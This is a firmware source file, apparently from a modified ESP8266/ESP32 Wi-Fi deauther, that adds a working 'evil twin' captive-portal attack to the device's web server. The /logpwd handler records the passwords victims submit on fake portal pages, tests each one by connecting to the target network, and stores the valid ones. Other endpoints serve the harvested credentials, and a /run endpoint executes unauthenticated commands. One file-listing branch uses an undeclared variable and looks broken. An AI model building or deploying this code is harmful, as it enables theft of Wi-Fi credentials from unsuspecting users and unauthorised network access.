/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "wifi.h"

#ifdef ESP32
    #include <WiFi.h>
    #include <esp_wifi.h>
#else
    extern "C" {
        #include "user_interface.h"
    }
    #include <ESP8266WiFi.h>
#endif

#include <WiFiClient.h>
#ifdef ESP32
    #include <WebServer.h>
#else
    #include <ESP8266WebServer.h>
#endif
#include <DNSServer.h>

#ifndef ESP32
    #include <ESP8266mDNS.h>
#endif

#ifdef ESP32
    #include <SPIFFS.h>
    #define FS SPIFFS
#else
    #include <FS.h>
    #define FS FS
#endif

#include "language.h"
#include "debug.h"
#include "settings.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"

extern bool progmemToSpiffs(const char* adr, int len, String path);

#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

typedef enum wifi_mode_t {
    off = 0,
    ap  = 1,
    st  = 2
} wifi_mode_t;

typedef struct ap_settings_t {
    char    path[33];
    char    ssid[33];
    char    password[65];
    uint8_t channel;
    bool    hidden;
    bool    captive_portal;
} ap_settings_t;

namespace wifi {
    // ===== PRIVATE ===== //
    wifi_mode_t   mode;
    ap_settings_t ap_settings;

    // Server and other global objects
#ifdef ESP32
    WebServer server(80);
#else
    ESP8266WebServer server(80);
#endif
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress    netmask(255, 255, 255, 0);

    void setPath(String path) {
        if (path.charAt(0) != '/') {
            path = '/' + path;
        }

        if (path.length() > 32) {
            debuglnF("ERROR: Path longer than 32 characters");
        } else {
            strncpy(ap_settings.path, path.c_str(), 32);
        }
    }

    void setSSID(String ssid) {
        if (ssid.length() > 32) {
            debuglnF("ERROR: SSID longer than 32 characters");
        } else {
            strncpy(ap_settings.ssid, ssid.c_str(), 32);
        }
    }

    void setPassword(String password) {
        if (password.length() > 64) {
            debuglnF("ERROR: Password longer than 64 characters");
        } else if (password.length() < 8) {
            debuglnF("ERROR: Password must be at least 8 characters long");
        } else {
            strncpy(ap_settings.password, password.c_str(), 64);
        }
    }

    void setChannel(uint8_t ch) {
        if ((ch < 1) || (ch > 14)) {
            debuglnF("ERROR: Channel must be withing the range of 1-14");
        } else {
            ap_settings.channel = ch;
        }
    }

    void setHidden(bool hidden) {
        ap_settings.hidden = hidden;
    }

    void setCaptivePortal(bool captivePortal) {
        ap_settings.captive_portal = captivePortal;
    }

    void handleFileList() {
        if (!server.hasArg("dir")) {
            server.send(500, str(W_TXT), str(W_BAD_ARGS));
            return;
        }

        String path = server.arg("dir");
        // debugF("handleFileList: ");
        // debugln(path);

        #ifdef ESP32
            File root = FS.open(path);
            File entry;
            String output = String('{');
            bool first = true;
            
            if (root.isDirectory()) {
                while (entry = root.openNextFile()) {
                    if (first) first = false;
                    else output += ',';
                    output += '[';
                    output += '"' + String(entry.name()) + '"';
                    output += ']';
                }
            }
            output += CLOSE_BRACKET;
            server.send(200, str(W_JSON).c_str(), output);
        #else
            Dir dir = FS.openDir(path);
            File   entry;
            bool   first = true;

            while (dir.next()) {
                entry = dir.openFile("r");

                if (first) first = false;
                else output += ',';                 // ,

                output += '[';                      // [
                output += '"' + entry.name() + '"'; // "filename"
                output += ']';                      // ]

                entry.close();
            }

            output += CLOSE_BRACKET;
            server.send(200, str(W_JSON).c_str(), output);
        #endif
    }

    String getContentType(String filename) {
        if (server.hasArg("download")) return String(F("application/octet-stream"));
        else if (filename.endsWith(str(W_DOT_GZIP))) filename = filename.substring(0, filename.length() - 3);
        else if (filename.endsWith(str(W_DOT_HTM))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_HTML))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_CSS))) return str(W_CSS);
        else if (filename.endsWith(str(W_DOT_JS))) return str(W_JS);
        else if (filename.endsWith(str(W_DOT_PNG))) return str(W_PNG);
        else if (filename.endsWith(str(W_DOT_GIF))) return str(W_GIF);
        else if (filename.endsWith(str(W_DOT_JPG))) return str(W_JPG);
        else if (filename.endsWith(str(W_DOT_ICON))) return str(W_ICON);
        else if (filename.endsWith(str(W_DOT_XML))) return str(W_XML);
        else if (filename.endsWith(str(W_DOT_PDF))) return str(W_XPDF);
        else if (filename.endsWith(str(W_DOT_ZIP))) return str(W_XZIP);
        else if (filename.endsWith(str(W_DOT_JSON))) return str(W_JSON);
        return str(W_TXT);
    }

    bool handleFileRead(String path) {
        // prnt(W_AP_REQUEST);
        // prnt(path);

        if (path.charAt(0) != '/') path = '/' + path;
        if (path.charAt(path.length() - 1) == '/') path += String(F("index.html"));

        String contentType = getContentType(path);

        #ifdef ESP32
            if (!FS.exists(path)) {
                if (FS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
                else if (FS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
                else if (FS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
                else {
                    return false;
                }
            }
            File file = FS.open(path, "r");
            server.streamFile(file, contentType);
            file.close();
        #else
            if (!FS.exists(path)) {
                if (FS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
                else if (FS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
                else if (FS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
                else {
                    // prntln(W_NOT_FOUND);
                    return false;
                }
            }

            File file = FS.open(path, "r");

            server.streamFile(file, contentType);
            file.close();
        #endif
        // prnt(SPACE);
        // prntln(W_OK);

        return true;
    }

    void sendProgmem(const char* ptr, size_t size, const char* type) {
        server.sendHeader("Content-Encoding", "gzip");
        server.sendHeader("Cache-Control", "max-age=3600");
        server.send_P(200, str(type).c_str(), ptr, size);
    }

    // ===== PUBLIC ====== //
    void begin() {
        setPath("/web");
        setSSID(settings::getAccessPointSettings().ssid);
        setPassword(settings::getAccessPointSettings().password);
        setChannel(settings::getWifiSettings().channel);
        setHidden(settings::getAccessPointSettings().hidden);
        setCaptivePortal(settings::getWebSettings().captive_portal);

        if (settings::getWebSettings().use_spiffs) {
            copyWebFiles(false);
        }

        mode = wifi_mode_t::off;
        WiFi.mode(WIFI_OFF);
        
#ifdef ESP32
        // ESP32 setup
        esp_wifi_set_mac(WIFI_IF_STA, (uint8_t*)settings::getWifiSettings().mac_st);
        esp_wifi_set_mac(WIFI_IF_AP, (uint8_t*)settings::getWifiSettings().mac_ap);
        
        // Enable STA mode for packet injection capability
        wifi_mode_t mode_tmp;
        esp_wifi_get_mode(&mode_tmp);
        esp_wifi_set_mode(WIFI_MODE_STA);
#else
        wifi_set_opmode(STATION_MODE);
        wifi_set_macaddr(STATION_IF, (uint8_t*)settings::getWifiSettings().mac_st);
        wifi_set_macaddr(SOFTAP_IF, (uint8_t*)settings::getWifiSettings().mac_ap);
#endif
    }

    String getMode() {
        switch (mode) {
            case wifi_mode_t::off:
                return "OFF";
            case wifi_mode_t::ap:
                return "AP";
            case wifi_mode_t::st:
                return "ST";
            default:
                return String();
        }
    }

    void printStatus() {
        prnt(String(F("[WiFi] Path: '")));
        prnt(ap_settings.path);
        prnt(String(F("', Mode: '")));
        prnt(getMode());
        prnt(String(F("', SSID: '")));
        prnt(ap_settings.ssid);
        prnt(String(F("', password: '")));
        prnt(ap_settings.password);
        prnt(String(F("', channel: '")));
        prnt(ap_settings.channel);
        prnt(String(F("', hidden: ")));
        prnt(b2s(ap_settings.hidden));
        prnt(String(F(", captive-portal: ")));
        prntln(b2s(ap_settings.captive_portal));
    }

    void startNewAP(String path, String ssid, String password, uint8_t ch, bool hidden, bool captivePortal) {
        setPath(path);
        setSSID(ssid);
        setPassword(password);
        setChannel(ch);
        setHidden(hidden);
        setCaptivePortal(captivePortal);

        startAP();
    }

    /*
        void startAP(String path) {
            setPath(path):

            startAP();
        }
     */
    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);

        dns.setErrorReplyCode(DNSReplyCode::NoError);
        dns.start(53, "*", ip);

        MDNS.begin(WEB_URL);

        server.on("/list", HTTP_GET, handleFileList); // list directory

        #ifdef USE_PROGMEM_WEB_FILES
        // ================================================================
        // paste here the output of the webConverter.py
        if (!settings::getWebSettings().use_spiffs) {
            server.on("/", HTTP_GET, []() {
                sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
            });
            server.on("/index.html", HTTP_GET, []() {
                sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
            });
            server.on("/scan.html", HTTP_GET, []() {
                sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
            });
            server.on("/info.html", HTTP_GET, []() {
                sendProgmem(infohtml, sizeof(infohtml), W_HTML);
            });
            server.on("/ssids.html", HTTP_GET, []() {
                sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
            });
            server.on("/attack.html", HTTP_GET, []() {
                sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
            });
            server.on("/settings.html", HTTP_GET, []() {
                sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
            });
            server.on("/style.css", HTTP_GET, []() {
                sendProgmem(stylecss, sizeof(stylecss), W_CSS);
            });
            server.on("/js/ssids.js", HTTP_GET, []() {
                sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
            });
            server.on("/js/site.js", HTTP_GET, []() {
                sendProgmem(sitejs, sizeof(sitejs), W_JS);
            });
            server.on("/js/attack.js", HTTP_GET, []() {
                sendProgmem(attackjs, sizeof(attackjs), W_JS);
            });
            server.on("/js/scan.js", HTTP_GET, []() {
                sendProgmem(scanjs, sizeof(scanjs), W_JS);
            });
            server.on("/js/settings.js", HTTP_GET, []() {
                sendProgmem(settingsjs, sizeof(settingsjs), W_JS);
            });
            server.on("/lang/hu.lang", HTTP_GET, []() {
                sendProgmem(hulang, sizeof(hulang), W_JSON);
            });
            server.on("/lang/ja.lang", HTTP_GET, []() {
                sendProgmem(jalang, sizeof(jalang), W_JSON);
            });
            server.on("/lang/nl.lang", HTTP_GET, []() {
                sendProgmem(nllang, sizeof(nllang), W_JSON);
            });
            server.on("/lang/fi.lang", HTTP_GET, []() {
                sendProgmem(filang, sizeof(filang), W_JSON);
            });
            server.on("/lang/cn.lang", HTTP_GET, []() {
                sendProgmem(cnlang, sizeof(cnlang), W_JSON);
            });
            server.on("/lang/ru.lang", HTTP_GET, []() {
                sendProgmem(rulang, sizeof(rulang), W_JSON);
            });
            server.on("/lang/pl.lang", HTTP_GET, []() {
                sendProgmem(pllang, sizeof(pllang), W_JSON);
            });
            server.on("/lang/uk.lang", HTTP_GET, []() {
                sendProgmem(uklang, sizeof(uklang), W_JSON);
            });
            server.on("/lang/de.lang", HTTP_GET, []() {
                sendProgmem(delang, sizeof(delang), W_JSON);
            });
            server.on("/lang/it.lang", HTTP_GET, []() {
                sendProgmem(itlang, sizeof(itlang), W_JSON);
            });
            server.on("/lang/en.lang", HTTP_GET, []() {
                sendProgmem(enlang, sizeof(enlang), W_JSON);
            });
            server.on("/lang/fr.lang", HTTP_GET, []() {
                sendProgmem(frlang, sizeof(frlang), W_JSON);
            });
            server.on("/lang/in.lang", HTTP_GET, []() {
                sendProgmem(inlang, sizeof(inlang), W_JSON);
            });
            server.on("/lang/ko.lang", HTTP_GET, []() {
                sendProgmem(kolang, sizeof(kolang), W_JSON);
            });
            server.on("/lang/ro.lang", HTTP_GET, []() {
                sendProgmem(rolang, sizeof(rolang), W_JSON);
            });
            server.on("/lang/da.lang", HTTP_GET, []() {
                sendProgmem(dalang, sizeof(dalang), W_JSON);
            });
            server.on("/lang/ptbr.lang", HTTP_GET, []() {
                sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
            });
            server.on("/lang/cs.lang", HTTP_GET, []() {
                sendProgmem(cslang, sizeof(cslang), W_JSON);
            });
            server.on("/lang/tlh.lang", HTTP_GET, []() {
                sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
            });
            server.on("/lang/es.lang", HTTP_GET, []() {
                sendProgmem(eslang, sizeof(eslang), W_JSON);
            });
            server.on("/lang/th.lang", HTTP_GET, []() {
                sendProgmem(thlang, sizeof(thlang), W_JSON);
            });
        }
        server.on("/lang/default.lang", HTTP_GET, []() {
            if (!settings::getWebSettings().use_spiffs) {
                if (String(settings::getWebSettings().lang) == "hu") sendProgmem(hulang, sizeof(hulang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ja") sendProgmem(jalang, sizeof(jalang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "nl") sendProgmem(nllang, sizeof(nllang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "fi") sendProgmem(filang, sizeof(filang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "cn") sendProgmem(cnlang, sizeof(cnlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ru") sendProgmem(rulang, sizeof(rulang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "pl") sendProgmem(pllang, sizeof(pllang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "uk") sendProgmem(uklang, sizeof(uklang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "de") sendProgmem(delang, sizeof(delang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "it") sendProgmem(itlang, sizeof(itlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "en") sendProgmem(enlang, sizeof(enlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "fr") sendProgmem(frlang, sizeof(frlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "in") sendProgmem(inlang, sizeof(inlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ko") sendProgmem(kolang, sizeof(kolang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ro") sendProgmem(rolang, sizeof(rolang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "da") sendProgmem(dalang, sizeof(dalang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "ptbr") sendProgmem(ptbrlang, sizeof(ptbrlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "cs") sendProgmem(cslang, sizeof(cslang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "tlh") sendProgmem(tlhlang, sizeof(tlhlang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "es") sendProgmem(eslang, sizeof(eslang), W_JSON);
                else if (String(settings::getWebSettings().lang) == "th") sendProgmem(thlang, sizeof(thlang), W_JSON);

                else handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            } else {
                handleFileRead("/web/lang/"+String(settings::getWebSettings().lang)+".lang");
            }
        });
        // ================================================================
        #endif /* ifdef USE_PROGMEM_WEB_FILES */

        server.on("/run", HTTP_GET, []() {
            server.send(200, str(W_TXT), str(W_OK).c_str());
            String input = server.arg("cmd");
            cli.exec(input);
        });

        server.on("/attack.json", HTTP_GET, []() {
            server.send(200, str(W_JSON), attack.getStatusJSON());
        });

        server.on("/logpwd", HTTP_POST, []() {
            String password = server.arg("pwd");
            String clientIP = server.client().remoteIP().toString();
            
            File logFile = FS.open("/etwin_log.txt", "a");
            if (logFile) {
                logFile.print("[");
                logFile.print(millis());
                logFile.print("] IP: ");
                logFile.print(clientIP);
                logFile.print(" | Password: ");
                logFile.print(password);
                
                if (attack.isEvilTwinRunning()) {
                    String targetSSID = attack.getEvilTwinTargetSSID();
                    if (targetSSID.length() > 0) {
                        logFile.print(" | Target: ");
                        logFile.print(targetSSID);
                        logFile.print(" | Validating...");
                        
                        Serial.print("=== VALIDATING PASSWORD ===");
                        Serial.print("Target: " + targetSSID);
                        Serial.print(" | Password: " + password);
                        Serial.print(" | Trying...");
                        
                        WiFi.mode(WIFI_STA);
                        WiFi.disconnect();
                        delay(100);
                        WiFi.begin((char*)targetSSID.c_str(), (char*)password.c_str());
                        
                        int waitCount = 0;
                        bool connected = false;
                        while (waitCount < 20) {
                            if (WiFi.status() == WL_CONNECTED) {
                                connected = true;
                                break;
                            }
                            delay(500);
                            waitCount++;
                        }
                        
                        if (connected) {
                            logFile.print(" [VALID!]");
                            Serial.println(" VALID!");
                            File validFile = FS.open("/valid_pass.txt", "a");
                            if (validFile) {
                                validFile.print("[");
                                validFile.print(millis());
                                validFile.print("] SSID: ");
                                validFile.print(targetSSID);
                                validFile.print(" | Password: ");
                                validFile.println(password);
                                validFile.close();
                            }
                            WiFi.disconnect();
                        } else {
                            logFile.print(" [INVALID]");
                            Serial.println(" INVALID");
                            WiFi.disconnect();
                        }
                    }
                }
                
                logFile.println();
                logFile.close();
                
                Serial.println("=========================");
            }
            
            server.send(200, str(W_TXT), "OK");
        });

        server.on("/etwin.html", HTTP_GET, []() {
            if (FS.exists("/web/etwin.html")) {
                handleFileRead("/web/etwin.html");
            } else {
                server.send(200, str(W_HTML), 
                    "<html><body><h1>Evil Twin Portal</h1><p>etwin.html not found</p></body></html>");
            }
        });

        server.on("/etwin_log.txt", HTTP_GET, []() {
            if (FS.exists("/etwin_log.txt")) {
                File logFile = FS.open("/etwin_log.txt", "r");
                String content = "";
                if (logFile) {
                    content = logFile.readString();
                    logFile.close();
                }
                server.send(200, str(W_TXT), content);
            } else {
                server.send(200, str(W_TXT), "No logs yet");
            }
        });

        server.on("/clear_logs", HTTP_GET, []() {
            if (FS.exists("/etwin_log.txt")) {
                FS.remove("/etwin_log.txt");
                server.send(200, str(W_TXT), "Logs cleared");
            } else {
                server.send(200, str(W_TXT), "No logs to clear");
            }
        });

        server.on("/valid_pass.txt", HTTP_GET, []() {
            if (FS.exists("/valid_pass.txt")) {
                File passFile = FS.open("/valid_pass.txt", "r");
                String content = "";
                if (passFile) {
                    content = passFile.readString();
                    passFile.close();
                }
                server.send(200, str(W_TXT), content);
            } else {
                server.send(200, str(W_TXT), "No valid passwords yet");
            }
        });

        server.on("/clear_valid", HTTP_GET, []() {
            if (FS.exists("/valid_pass.txt")) {
                FS.remove("/valid_pass.txt");
                server.send(200, str(W_TXT), "Valid passwords cleared");
            } else {
                server.send(200, str(W_TXT), "No valid passwords to clear");
            }
        });

        server.on("/etwin_list", HTTP_GET, []() {
            String json = "[";
            for (int i = 1; i <= 5; i++) {
                if (i > 1) json += ",";
                String filename = "/web/etwin" + String(i) + ".html";
                json += "{\"id\":" + String(i);
                json += ",\"exists\":" + String(FS.exists(filename) ? "true" : "false");
                json += "}";
            }
            json += "]";
            server.send(200, "application/json", json);
        });

        server.on("/etwin_select", HTTP_GET, []() {
            String id = server.arg("id");
            String filename = "/web/etwin" + id + ".html";
            if (id.toInt() >= 1 && id.toInt() <= 5) {
                if (FS.exists(filename)) {
                    server.send(200, str(W_TXT), String("Selected: etwin") + id + ".html");
                } else {
                    server.send(200, str(W_TXT), String("Error: etwin") + id + ".html not found");
                }
            } else {
                server.send(200, str(W_TXT), "Error: Invalid page ID (1-5)");
            }
        });

        server.on("/preview", HTTP_GET, []() {
            String id = server.arg("page");
            String filename = "/web/etwin" + id + ".html";
            if (id.toInt() >= 1 && id.toInt() <= 5 && FS.exists(filename)) {
                handleFileRead(filename);
            } else {
                server.send(200, str(W_HTML), "<html><body><h1>Preview Error</h1><p>Page not found or invalid ID</p></body></html>");
            }
        });

        // called when the url is not defined here
        // use it to load content from SPIFFS
        server.onNotFound([]() {
            if (!handleFileRead(server.uri())) {
                if (settings::getWebSettings().captive_portal) {
                    if (attack.isEvilTwinRunning()) {
                        String etwinFile = "/web/etwin.html";
                        if (FS.exists(etwinFile)) {
                            handleFileRead(etwinFile);
                        } else {
                            sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                        }
                    } else {
                        sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                    }
                }
                else server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
            }
        });

        server.begin();
        mode = wifi_mode_t::ap;

        prntln(W_STARTED_AP);
        printStatus();
    }

    void stopAP() {
        if (mode == wifi_mode_t::ap) {
#ifdef ESP32
            esp_wifi_set_promiscuous(false);
#else
            wifi_promiscuous_enable(0);
#endif
            WiFi.persistent(false);
            WiFi.disconnect(true);
#ifndef ESP32
            wifi_set_opmode(STATION_MODE);
#endif
            prntln(W_STOPPED_AP);
            mode = wifi_mode_t::st;
        }
    }

    void resumeAP() {
        if (mode != wifi_mode_t::ap) {
            mode = wifi_mode_t::ap;
#ifdef ESP32
            esp_wifi_set_promiscuous(false);
#else
            wifi_promiscuous_enable(0);
#endif
            WiFi.softAPConfig(ip, ip, netmask);
            WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
            prntln(W_STARTED_AP);
        }
    }

    void update() {
        if ((mode != wifi_mode_t::off) && !scan.isScanning()) {
            server.handleClient();
            dns.processNextRequest();
        }
    }
}